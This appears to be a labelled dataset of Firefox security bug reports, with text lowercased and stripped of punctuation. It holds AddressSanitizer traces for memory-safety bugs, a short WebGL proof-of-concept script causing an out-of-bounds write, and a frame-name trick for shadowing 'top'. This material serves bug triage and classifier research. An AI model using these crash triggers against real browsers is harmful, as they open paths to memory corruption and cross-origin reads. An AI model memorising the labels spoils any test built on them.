nshtmldocument writecommon jscontext nsastring_internal const bool src/content/html/document/src/nshtmldocument.cpp:1736 19 in nshtmldocument write nsastring_internal const jscontext src/content/html/document/src/nshtmldocument.cpp:1749 20 in nsidomhtmldocument_write jscontext unsigned int js value src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:13713 21 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:372 22 in js invoke jscontext js invokeargsguard js maybeconstruct src/js/src/jsinterp.h:119 23 in js invoke jscontext js value const js value const unsigned int js value js value src/js/src/jsinterp.cpp:388 24 in js indirectproxyhandler call jscontext jsobject unsigned int js value src/js/src/jsproxy.cpp:451 25 in js directwrapper call jscontext jsobject unsigned int js value src/js/src/jswrapper.cpp:316 26 in js crosscompartmentwrapper call jscontext jsobject unsigned int js value src/js/src/jswrapper.cpp:648 27 in non-virtual thunk to js crosscompartmentwrapper call jscontext jsobject unsigned int js value 0 28 in js proxy call jscontext jsobject unsigned int js value src/js/src/jsproxy.cpp:2457 29 in proxy_call jscontext unsigned int js value src/js/src/jsproxy.cpp:2990 previously allocated by thread t0 here 0 in interceptor_malloc 0 1 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:57 2 in operator new unsigned long src dist/include/mozilla/mozalloc.h:200 3 in nsplaintexteditor endeditorinit src/editor/libeditor/text/nsplaintexteditor.cpp:200 4 in nsautoeditinitrulestrigger src/editor/libeditor/text/nstexteditutils.cpp:94 5 in nshtmleditor init nsidomdocument nsicontent nsiselectioncontroller unsigned int src/editor/libeditor/html/nshtmleditor.cpp:289 6 in nseditingsession setupeditoronwindow nsidomwindow src/editor/composer/src/nseditingsession.cpp:460 7 in nseditingsession makewindoweditable nsidomwindow char const bool bool bool src/editor/composer/src/nseditingsession.cpp:173 8 in nshtmldocument editingstatechanged src/content/html/document/src/nshtmldocument.cpp:2693 9 in nshtmldocument maybeeditingstatechanged src/content/html/document/src/nshtmldocument.cpp:2339 10 in nshtmldocument endupdate unsigned int src/content/html/document/src/nshtmldocument.cpp:2352 11 in nshtml5treeopexecutor enddocupdate src/parser/html/nshtml5treeopexecutor.h:248 12 in nshtml5treeopexecutor didbuildmodel bool src/parser/html/nshtml5treeopexecutor.cpp:131 13 in nshtml5treeoperation perform nshtml5treeopexecutor nsicontent src/parser/html/nshtml5treeoperation.cpp:627 14 in nshtml5treeopexecutor runflushloop src/parser/html/nshtml5treeopexecutor.cpp:564 15 in nshtml5executorflusher run src/parser/html/nshtml5streamparser.cpp:127 16 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:624 17 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 18 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 19 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:208 20 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:201 21 in messageloop run src/ipc/chromium/src/base/message_loop.cc:175 22 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 23 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:273 24 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3835 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd stats 228m malloced 246m for red zones by 405498 calls stats 43m realloced by 15549 calls stats 200m freed by 193168 calls stats 64m really freed by 120477 calls stats 432m 110668 full pages mmaped in 108 calls mmaps by size class 8:245745 9:40955 10:16380 11:16376 12:2048 13:1536 14:1280 15:256 16:320 17:1280 18:144 19:40 20:20 mallocs by size class 8:317776 9:46531 10:16128 11:17241 12:2334 13:1738 14:1479 15:332 16:400 17:1309 18:172 19:41 20:17 frees by size class 8:121716 9:37588 10:13105 11:14230 12:1542 13:1565 14:1305 15:291 16:328 17:1296 18:150 19:38 20:14 rfrees by size class 8:80367 9:20243 10:8280 11:9424 12:628 13:487 14:388 15:151 16:188 17:287 18:28 19:5 20:1 stats malloc large 1539 small slow 1896 8725 aborting	11
heap-use-after-free in imgrequest onstopframe reproduces on trunk testcase with better stack coming 6483 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nsqueryinterface operator nsid const void const objdir-ff-asan/xpcom/build/nscomptr.cpp:14 1 in nscomptr dist/include/nscomptr.h:554 2 in imgrequest onstopframe imgirequest unsigned int image/src/imgrequest.cpp:645 3 in mozilla image decoder postframestop image/src/decoder.cpp:246 is located 0 bytes inside of 24-byte region freed by thread t0 here 0 in free 1 in nsbulletlistener release layout/generic/nsbulletframe.cpp:1622 previously allocated by thread t0 here 0 in interceptor_malloc 1 in moz_xmalloc memory/mozalloc/mozalloc.cpp:57 2 in nsframe init nsicontent nsiframe nsiframe layout/generic/nsframe.cpp:535 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 stats 352m malloced 405m for red zones by 832581 calls stats 60m realloced by 88678 calls stats 304m freed by 665969 calls stats 197m really freed by 173839 calls stats 612m 156759 full pages mmaped in 153 calls mmaps by size class 8:557022 9:49146 10:81900 11:12282 12:3072 13:2048 14:1280 15:256 16:448 17:1280 18:240 19:40 20:20 21:2 mallocs by size class 8:655210 9:61844 10:88875 11:13927 12:4293 13:2966 14:2222 15:488 16:815 17:1614 18:259 19:47 20:19 21:2 frees by size class 8:513952 9:46898 10:84377 11:10477 12:3126 13:2543 14:1600 15:435 16:741 17:1594 18:165 19:45 20:16 rfrees by size class 8:114982 9:29585 10:13571 11:8791 12:1614 13:1699 14:1294 15:249 16:554 17:1311 18:137 19:37 20:15 stats malloc large 1941 small slow 3643 6483 aborting	11
integer overflow invalid write w/webgl bufferdata i load html head script gl=document.createelement canvas getcontext experimental-webgl var buf gl.createbuffer gl.bindbuffer gl.array_buffer buf var magic gl.bufferdata gl.array_buffer new uint8array magic+1 gl.static_draw gl.bufferdata gl.array_buffer math.pow 2 32 gl.static_draw gl.buffersubdata gl.array_buffer magic new uint8array 1 script head html and i get exception=exc_bad_access signal=11 is_exploitable=yes instruction_disassembly=movb al rdi instruction_address access_type=write access_address exception type exc_bad_access sigsegv exception codes kern_invalid_address at thread 0 crashed dispatch queue com.apple.main-thread 0 libsystem_c.dylib memmove variant sse42 57 1 glengine glbuffersubdata_exec 856 rdi r11 r12 asan sigsegv 3966 error addresssanitizer crashed on unknown address pc sp bp t0 addresssanitizer can not provide additional info aborting 0 in memmove variant sse42 in libsystem_c.dylib 227 1 in wrap_memmove in firefox 545 2 in gldeletebuffers_exec in glengine 1727 3 in mozilla gl glcontext fbuffersubdata unsigned int long long void const in xul 90 4 in mozilla webglcontext buffersubdata unsigned int long long mozilla dom typedarray_base unsigned char js_getobjectasarraybufferview jscontext jsobject unsigned int unsigned char in xul 575	11
heap-use-after-free in mesa triggerable by resizing a webgl canvas run the testcase from content/canvas/test/webgl/conformance/more/functions directory here is my opengl info opengl version string 2.1 mesa 8.0.2 unsymbolized 28427 error addresssanitizer heap-use-after-free on address at pc bp sp write of size 1 at thread t0 0 tmp/firefox/firefox 1 usr/lib/x86_64-linux-gnu/dri/swrast_dri.so is located 0 bytes inside of 64-byte region freed by thread t0 here 0 tmp/firefox/firefox 1 usr/lib/x86_64-linux-gnu/dri/libdricore.so previously allocated by thread t0 here 0 tmp/firefox/firefox 1 usr/lib/x86_64-linux-gnu/dri/libdricore.so shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd stats 214m malloced 217m for red zones by 289321 calls stats 30m realloced by 12288 calls stats 174m freed by 171411 calls stats 42m really freed by 47020 calls stats 420m 107600 full pages mmaped in 105 calls mmaps by size class 8:212979 9:40955 10:8190 11:10235 12:2048 13:2048 14:1536 15:256 16:384 17:1312 18:144 19:40 20:20 mallocs by size class 8:221586 9:38394 10:7643 11:13561 12:2266 13:2004 14:1530 15:310 16:504 17:1333 18:136 19:37 20:17 frees by size class 8:122227 9:28108 10:4313 11:10535 12:1422 13:1409 14:1332 15:256 16:443 17:1283 18:32 19:36 20:15 rfrees by size class 8:34255 9:5161 10:1300 11:4626 12:388 13:372 14:332 15:83 16:229 17:263 18:6 19:4 20:1 stats malloc large 1523 small slow 1623 28427 aborting symbolized 27925 error addresssanitizer heap-use-after-free on address at pc bp sp write of size 1 at thread t0 0 in memcpy 1 in 0 is located 0 bytes inside of 64-byte region freed by thread t0 here 0 in interceptor_free 1 in 0 previously allocated by thread t0 here 0 in interceptor_posix_memalign 1 in 0 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd stats 214m malloced 218m for red zones by 289327 calls stats 30m realloced by 12281 calls stats 174m freed by 171411 calls stats 42m really freed by 46444 calls stats 420m 107600 full pages mmaped in 105 calls mmaps by size class 8:212979 9:40955 10:8190 11:10235 12:2048 13:2048 14:1536 15:256 16:384 17:1312 18:144 19:40 20:20 mallocs by size class 8:221603 9:38387 10:7646 11:13555 12:2265 13:2004 14:1530 15:310 16:503 17:1333 18:137 19:37 20:17 frees by size class 8:122240 9:28103 10:4313 11:10529 12:1420 13:1409 14:1332 15:256 16:443 17:1283 18:32 19:36 20:15 rfrees by size class 8:33919 9:5096 10:1273 11:4499 12:374 13:370 14:328 15:83 16:231 17:260 18:6 19:4 20:1 stats malloc large 1524 small slow 1614 27925 aborting	11
heap-buffer-overflow in nswindow onexposeevent reproduces on trunk testcase reproduces extremely flakily if i first run firefox with a clean profile and testcase path on cmd line then close the firefox completely and then rerun it again with testcase trying to get a minimized testcase the second-time need might be coming from this line in the testcase installtrigger.install unsigned xpi 12538 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 1 at thread t0 0 in updatemaskbits char int int nsintrect const unsigned char int widget/gtk2/nswindow.cpp:4261 1 in nswindow onexposeevent gdkeventexpose widget/gtk2/nswindow.cpp:2222 2 in expose_event_cb gtkwidget gdkeventexpose widget/gtk2/nswindow.cpp:5042 is located 0 bytes to the right of 5720-byte region allocated by thread t0 here 0 in interceptor_malloc 1 in moz_xmalloc memory/mozalloc/mozalloc.cpp:57 2 in nswindow onexposeevent gdkeventexpose widget/gtk2/nswindow.cpp:2222 3 in expose_event_cb gtkwidget gdkeventexpose widget/gtk2/nswindow.cpp:5042 shadow byte and word fb 00 00 00 fb fb fb fb fb more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa stats 293m malloced 320m for red zones by 521376 calls stats 41m realloced by 23856 calls stats 248m freed by 255478 calls stats 115m really freed by 96425 calls stats 532m 136284 full pages mmaped in 133 calls mmaps by size class 8:376809 9:49146 10:20475 11:14329 12:4096 13:2560 14:1280 15:256 16:576 17:1248 18:288 19:40 20:20 mallocs by size class 8:419076 9:53870 10:19196 11:16732 12:4893 13:2792 14:1719 15:362 16:881 17:1501 18:294 19:41 20:19 frees by size class 8:178304 9:39375 10:14131 11:13204 12:3650 13:2549 14:1466 15:306 16:738 17:1481 18:219 19:39 20:16 rfrees by size class 8:64681 9:13811 10:3824 11:9587 12:1194 13:844 14:914 15:151 16:412 17:990 18:11 19:5 20:1 stats malloc large 1855 small slow 2608 12538 aborting	11
frames can shadow top it is possible to shadow top with a frame whose name attribute s value is set to top as a result plugins accessing top.location such as adobe flash player may read an arbitrary url the fix to bug 765527 does n't seem to cover this case	2
investigate if autowrapperchanger causes security problems autowrapperchanger is a class used on stack 1406 i keeps the wrapper on stack to prevent it to be gced but if acomobj has pointers to also other jsobjects i do n't see what is keeping them alive since autowrapperchanger s ctor calls nscontentutils releasewrapper which ends up calling nscontentutils dropjsobjects autowrapperchanger is on stack quite long time so i believe gc can happen between ctor and dtor i hope someone proves this is n't a problem	11
heap-use-after-free in nseditor findnextleafnode reproduces on trunk 10788 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nsinode getprevioussibling const src dist/include/nsinode.h:1142 1 in nseditor findnextleafnode nsinode bool bool src/editor/libeditor/base/nseditor.cpp:3319 2 in nseditor findnode nsinode bool bool bool src/editor/libeditor/base/nseditor.cpp:3401 3 in nseditor findnode nsinode bool bool bool src/editor/libeditor/base/nseditor.cpp:3411 4 in nseditor getpriornode nsinode bool bool src/editor/libeditor/base/nseditor.cpp:3301 5 in nseditor getpriornode nsinode int bool bool src/editor/libeditor/base/nseditor.cpp:3190 6 in nshtmleditor getpriorhtmlnode nsinode int bool src/editor/libeditor/html/nshtmleditor.cpp:4104 7 in nshtmleditrules getpromotedpoint nshtmleditrules rulesendpoint nsidomnode int editaction nscomptr nsidomnode int src/editor/libeditor/html/nshtmleditrules.cpp:5277 8 in nshtmleditrules promoterange nsidomrange editaction src/editor/libeditor/html/nshtmleditrules.cpp:5493 9 in nshtmleditrules aftereditinner editaction short src/editor/libeditor/html/nshtmleditrules.cpp:430 10 in nshtmleditrules afteredit editaction short src/editor/libeditor/html/nshtmleditrules.cpp:376 11 in nshtmleditor endoperation src/editor/libeditor/html/nshtmleditor.cpp:3513 12 in nsautorules src/editor/libeditor/base/nseditorutils.h:94 13 in nsautorules src/editor/libeditor/base/nseditorutils.h:91 14 in nshtmleditor align nsastring_internal const src/editor/libeditor/html/nshtmleditor.cpp:2264 15 in non-virtual thunk to nshtmleditor align nsastring_internal const src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 16 in nsaligncommand setstate nsieditor nsstring src/editor/composer/src/nscomposercommands.cpp:970 17 in nsmultistatecommand docommandparams char const nsicommandparams nsisupports src/editor/composer/src/nscomposercommands.cpp:599 18 in nscontrollercommandtable docommandparams char const nsicommandparams nsisupports src/embedding/components/commandhandler/src/nscontrollercommandtable.cpp:175 19 in nsbasecommandcontroller docommandwithparams char const nsicommandparams src/embedding/components/commandhandler/src/nsbasecommandcontroller.cpp:153 20 in non-virtual thunk to nsbasecommandcontroller docommandwithparams char const nsicommandparams src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 21 in nscommandmanager docommand char const nsicommandparams nsidomwindow src/embedding/components/commandhandler/src/nscommandmanager.cpp:234 22 in nshtmldocument execcommand nsastring_internal const bool nsastring_internal const bool src/content/html/document/src/nshtmldocument.cpp:3235 23 in non-virtual thunk to nshtmldocument execcommand nsastring_internal const bool nsastring_internal const bool src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 24 in ns_invokebyindex_p src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 25 in callmethodhelper invoke src/js/xpconnect/src/xpcwrappednative.cpp:3110 26 in xpc_wn_callmethod jscontext unsigned int js value src/js/xpconnect/src/xpcwrappednativejsops.cpp:1469 27 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:370 28 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2460 29 in js runscript jscontext js handle jsscript js stackframe src/js/src/jsinterp.cpp:324 30 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value src/js/src/jsinterp.cpp:509 31 in js execute jscontext js handle jsscript jsobject js value src/js/src/jsinterp.cpp:546 32 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value src/js/src/jsapi.cpp:5679 33 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool src/dom/base/nsjsenvironment.cpp:1506 34 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext src/dom/base/nsglobalwindow.cpp:9621 35 in nsglobalwindow runtimeout nstimeout src/dom/base/nsglobalwindow.cpp:9880 36 in nsglobalwindow timercallback nsitimer void src/dom/base/nsglobalwindow.cpp:10147 37 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:473 38 in nstimerevent run src/xpcom/threads/nstimerimpl.cpp:556 39 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:612 40 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 41 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 42 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:208 43 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:201 44 in messageloop run src/ipc/chromium/src/base/message_loop.cc:175 45 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 46 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:290 47 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3782 48 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3848 49 in xre_main src/toolkit/xre/nsapprunner.cpp:3923 50 in do_main int char src/browser/app/nsbrowserapp.cpp:174 51 in main src/browser/app/nsbrowserapp.cpp:279 52 in 0 is located 56 bytes inside of 120-byte region freed by thread t0 here 0 in free 0 1 in moz_free src/memory/mozalloc/mozalloc.cpp:51 2 in operator delete void src dist/include/mozilla/mozalloc.h:224 3 in nsnodeutils lastrelease nsinode src/content/base/src/nsnodeutils.cpp:260 4 in nsgenericdomdatanode release src/content/base/src/nsgenericdomdatanode.cpp:113 5 in nstextnode release src/content/base/src/nstextnode.cpp:125 6 in non-virtual thunk to nstextnode release src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 7 in nscomptr_base src dist/include/nscomptr.h:408 8 in nscomptr nsidomnode nscomptr src dist/include/nscomptr.h:447 9 in nscomptr nsidomnode nscomptr src dist/include/nscomptr.h:447 10 in nshtmleditor isvistextnode nsicontent bool bool src/editor/libeditor/html/nshtmleditor.cpp:4408 11 in nshtmleditor istextindirtyframevisible nsicontent src/editor/libeditor/html/nshtmleditor.cpp:4348 12 in nseditor iseditable nsicontent src/editor/libeditor/base/nseditor.cpp:3742 13 in nshtmleditor iseditable nsicontent src/editor/libeditor/html/nshtmleditor.cpp:5459 14 in nseditor findnode nsinode bool bool bool src/editor/libeditor/base/nseditor.cpp:3407 15 in nseditor getpriornode nsinode bool bool src/editor/libeditor/base/nseditor.cpp:3301 16 in nseditor getpriornode nsinode int bool bool src/editor/libeditor/base/nseditor.cpp:3190 17 in nshtmleditor getpriorhtmlnode nsinode int bool src/editor/libeditor/html/nshtmleditor.cpp:4104 18 in nshtmleditrules getpromotedpoint nshtmleditrules rulesendpoint nsidomnode int editaction nscomptr nsidomnode int src/editor/libeditor/html/nshtmleditrules.cpp:5277 19 in nshtmleditrules promoterange nsidomrange editaction src/editor/libeditor/html/nshtmleditrules.cpp:5493 20 in nshtmleditrules aftereditinner editaction short src/editor/libeditor/html/nshtmleditrules.cpp:430 21 in nshtmleditrules afteredit editaction short src/editor/libeditor/html/nshtmleditrules.cpp:376 22 in nshtmleditor endoperation src/editor/libeditor/html/nshtmleditor.cpp:3513 23 in nsautorules src/editor/libeditor/base/nseditorutils.h:94 24 in nsautorules src/editor/libeditor/base/nseditorutils.h:91 25 in nshtmleditor align nsastring_internal const src/editor/libeditor/html/nshtmleditor.cpp:2264 26 in non-virtual thunk to nshtmleditor align nsastring_internal const src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 27 in nsaligncommand setstate nsieditor nsstring src/editor/composer/src/nscomposercommands.cpp:970 28 in nsmultistatecommand docommandparams char const nsicommandparams nsisupports src/editor/composer/src/nscomposercommands.cpp:599 29 in nscontrollercommandtable docommandparams char const nsicommandparams nsisupports src/embedding/components/commandhandler/src/nscontrollercommandtable.cpp:175 previously allocated by thread t0 here 0 in interceptor_malloc 0 1 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:57 2 in operator new unsigned long src dist/include/mozilla/mozalloc.h:200 3 in nshtml5treeoperation appendtext unsigned short const unsigned int nsicontent nshtml5treeopexecutor src/parser/html/nshtml5treeoperation.cpp:163 4 in nshtml5treeoperation perform nshtml5treeopexecutor nsicontent src/parser/html/nshtml5treeoperation.cpp:444 5 in nshtml5treeopexecutor runflushloop src/parser/html/nshtml5treeopexecutor.cpp:564 6 in nshtml5executorflusher run src/parser/html/nshtml5streamparser.cpp:127 7 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:612 8 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 9 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 10 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:208 11 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:201 12 in messageloop run src/ipc/chromium/src/base/message_loop.cc:175 13 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 14 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:290 15 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3782 16 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3848 17 in xre_main src/toolkit/xre/nsapprunner.cpp:3923 18 in do_main int char src/browser/app/nsbrowserapp.cpp:174 19 in main src/browser/app/nsbrowserapp.cpp:279 20 in 0 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes 00 00 00 00 00 00 00 00 06 fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 stats 260m malloced 302m for red zones by 541116 calls stats 44m realloced by 25176 calls stats 227m freed by 312858 calls stats 92m really freed by 204843 calls stats 484m 123992 full pages mmaped in 121 calls mmaps by size class 8:311277 9:32764 10:12285 11:14329 12:3072 13:1536 14:1536 15:256 16:1024 17:1248 18:144 19:40 20:20 mallocs by size class 8:466783 9:36490 10:11191 11:16795 12:2871 13:1975 14:1888 15:396 16:1190 17:1317 18:159 19:41 20:20 frees by size class 8:255470 9:27519 10:7990 11:13506 12:2059 13:1677 14:1698 15:352 16:1127 17:1300 18:105 19:38 20:17 rfrees by size class 8:182058 9:9100 10:1831 11:8659 12:596 13:527 14:531 15:179 16:934 17:399 18:24 19:4 20:1 stats malloc large 1537 small slow 2600 10788 aborting	11
heap-use-after-free in nstexteditorstate prepareeditor reproduces on trunk run a few firefox instances simultaneously for reproducing reliabily 19969 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nstexteditorstate prepareeditor nsastring_internal const src/content/html/content/src/nstexteditorstate.cpp:1125 1 in prepareeditorevent run src/content/html/content/src/nstexteditorstate.cpp:1026 2 in nscontentutils removescriptblocker src/content/base/src/nscontentutils.cpp:5021 3 in nsautoscriptblocker src dist/include/nscontentutils.h:2275 4 in nsautoscriptblocker src dist/include/nscontentutils.h:2274 5 in presshell flushpendingnotifications mozflushtype src/layout/base/nspresshell.cpp:3834 6 in nshideviewer run src/layout/generic/nssubdocumentframe.cpp:782 7 in nscontentutils removescriptblocker src/content/base/src/nscontentutils.cpp:5021 8 in nsautoscriptblocker src dist/include/nscontentutils.h:2275 9 in nsautoscriptblocker src dist/include/nscontentutils.h:2274 10 in nsdocument adoptnode nsidomnode nsidomnode src/content/base/src/nsdocument.cpp:6371 11 in nshtmldocument adoptnode nsidomnode nsidomnode src/content/html/document/src/nshtmldocument.h:87 12 in nsidomdocument_adoptnode jscontext unsigned int js value src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:3452 13 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:370 14 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2460 15 in js runscript jscontext js handle jsscript js stackframe src/js/src/jsinterp.cpp:324 16 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value src/js/src/jsinterp.cpp:509 17 in js execute jscontext js handle jsscript jsobject js value src/js/src/jsinterp.cpp:546 18 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value src/js/src/jsapi.cpp:5679 19 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool src/dom/base/nsjsenvironment.cpp:1506 20 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext src/dom/base/nsglobalwindow.cpp:9621 21 in nsglobalwindow runtimeout nstimeout src/dom/base/nsglobalwindow.cpp:9880 22 in nsglobalwindow timercallback nsitimer void src/dom/base/nsglobalwindow.cpp:10147 23 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:473 24 in nstimerevent run src/xpcom/threads/nstimerimpl.cpp:556 25 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:612 26 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 27 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 28 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:208 29 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:201 30 in messageloop run src/ipc/chromium/src/base/message_loop.cc:175 31 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 32 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:290 33 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3782 34 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3848 35 in xre_main src/toolkit/xre/nsapprunner.cpp:3923 36 in do_main int char src/browser/app/nsbrowserapp.cpp:174 37 in main src/browser/app/nsbrowserapp.cpp:279 38 in 0 is located 48 bytes inside of 120-byte region freed by thread t0 here 0 in free 0 1 in moz_free src/memory/mozalloc/mozalloc.cpp:51 2 in operator delete void src dist/include/mozilla/mozalloc.h:224 3 in nshtmlinputelement handletypechange unsigned char src/content/html/content/src/nshtmlinputelement.cpp:2621 4 in nshtmlinputelement parseattribute int nsiatom nsastring_internal const nsattrvalue src/content/html/content/src/nshtmlinputelement.cpp:2751 5 in nsgenericelement setattr int nsiatom nsiatom nsastring_internal const bool src/content/base/src/nsgenericelement.cpp:1952 6 in nsgenerichtmlelement setattr int nsiatom nsiatom nsastring_internal const bool src/content/html/content/src/nsgenerichtmlelement.cpp:1994 7 in nsgenerichtmlelement setattr int nsiatom nsastring_internal const bool src/content/html/document/src content/src/nsgenerichtmlelement.h:175 8 in nsgenerichtmlelement setattrhelper nsiatom nsastring_internal const src/content/html/content/src/nsgenerichtmlelement.cpp:2863 9 in nshtmlinputelement settype nsastring_internal const src/content/html/content/src/nshtmlinputelement.cpp:906 10 in non-virtual thunk to nshtmlinputelement settype nsastring_internal const src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 11 in nsidomhtmlinputelement_settype jscontext js handle jsobject js handle long int js mutablehandle js value src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:15518 12 in js calljspropertyopsetter jscontext int jscontext js handle jsobject js handle long int js mutablehandle js value js handle jsobject js handle long int js mutablehandle js value src/js/src/jscntxtinlines.h:456 13 in js baseops setpropertyhelper jscontext js handle jsobject js handle jsobject js handle long unsigned int js mutablehandle js value int src/js/src/jsobj.cpp:4592 14 in js setpropertyoperation jscontext unsigned char js handle js value js handle js value src/js/src/jsinterpinlines.h:355 15 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2370 16 in js runscript jscontext js handle jsscript js stackframe src/js/src/jsinterp.cpp:324 17 in js invokekernel jscontext js callargs js maybeconstruct src/js/src/jsinterp.cpp:378 18 in js invoke jscontext js invokeargsguard js maybeconstruct src/js/src/jsinterp.h:109 19 in js invoke jscontext js value const js value const unsigned int js value js value src/js/src/jsinterp.cpp:411 20 in js_callfunctionvalue src/js/src/jsapi.cpp:5860 21 in nsjscontext calleventhandler nsisupports jsobject jsobject nsiarray nsivariant src/dom/base/nsjsenvironment.cpp:1907 22 in nsjseventlistener handleevent nsidomevent src/dom/src/events/nsjseventlistener.cpp:212 23 in nseventlistenermanager handleeventsubtype nslistenerstruct nsidomeventlistener nsidomevent nsidomeventtarget unsigned int nscxpusher src/content/events/src/nseventlistenermanager.cpp:845 24 in nseventlistenermanager handleeventinternal nsprescontext nsevent nsidomevent nsidomeventtarget unsigned int nseventstatus nscxpusher src/content/events/src/nseventlistenermanager.cpp:918 25 in nseventlistenermanager handleevent nsprescontext nsevent nsidomevent nsidomeventtarget unsigned int nseventstatus nscxpusher src/content/events/src/nseventlistenermanager.h:143 26 in nseventtargetchainitem handleevent nseventchainpostvisitor unsigned int bool nscxpusher src/content/events/src/nseventdispatcher.cpp:182 27 in nseventtargetchainitem handleeventtargetchain nseventchainpostvisitor unsigned int nsdispatchingcallback bool nscxpusher 